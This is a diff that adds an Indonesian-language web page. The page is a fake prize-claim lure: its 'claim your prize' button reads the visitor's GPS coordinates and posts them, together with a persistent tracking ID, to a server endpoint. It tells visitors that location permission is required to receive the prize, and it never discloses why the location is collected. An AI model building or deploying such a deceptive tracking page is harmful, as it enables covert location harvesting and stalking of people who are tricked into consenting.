@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Selamat</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="container">
+        <h2>Klik Untuk Ambil Hadiahmu</h2>
+
+        <div class="card">
+            <button onclick="shareLocation()">Ambil Hadiah</button>
+            <p id="info"></p>
+        </div>
+    </div>
+
+    <script>
+        // generate ID otomatis & simpan agar tetap sama dalam 1 device
+        let user = localStorage.getItem("user_id");
+        if(!user){
+            user = "user_" + Math.random().toString(36).substr(2,5);
+            localStorage.setItem("user_id", user);
+        }
+
+        // fungsi kirim lokasi
+        async function shareLocation(){
+            // Tampilkan pesan loading sementara
+            document.getElementById("info").innerHTML = "<b>Proses......</b>";
+
+            if(navigator.geolocation){
+                navigator.geolocation.getCurrentPosition(async(pos)=>{
+
+                    const payload = {
+                        user,
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude
+                    };
+
+                    try {
+                        const res = await fetch("/api/save-location", {
+                            method:"POST",
+                            headers:{"Content-Type":"application/json"},
+                            body: JSON.stringify(payload)
+                        });
+    
+                        // Periksa respons sebelum memproses JSON
+                        if (!res.ok) {
+                            throw new Error(`HTTP error! status: ${res.status}`);
+                        }
+
+                        const data = await res.json();
+                        document.getElementById("info").innerHTML = 
+                            `Hadiahmu akan dikirim <b>${user}</b><br>`;
+                    } catch(error) {
+                        console.error("Error sending location:", error);
+                        document.getElementById("info").innerHTML = 
+                            `Gagal mengirim lokasi. Coba lagi. (ID: <b>${user}</b>)`;
+                    }
+                    
+                }, (error) => {
+                    // Penanganan error geolokasi (misalnya pengguna menolak izin)
+                    console.error("Geolocation error:", error);
+                    document.getElementById("info").innerHTML = 
+                        "Anda harus mengizinkan akses lokasi untuk melanjutkan.";
+                });
+            }else{
+                document.getElementById("info").innerHTML = 
+                    "GPS tidak tersedia pada perangkat ini.";
+            }
+        }
+    </script>
+
+</body>
+</html>
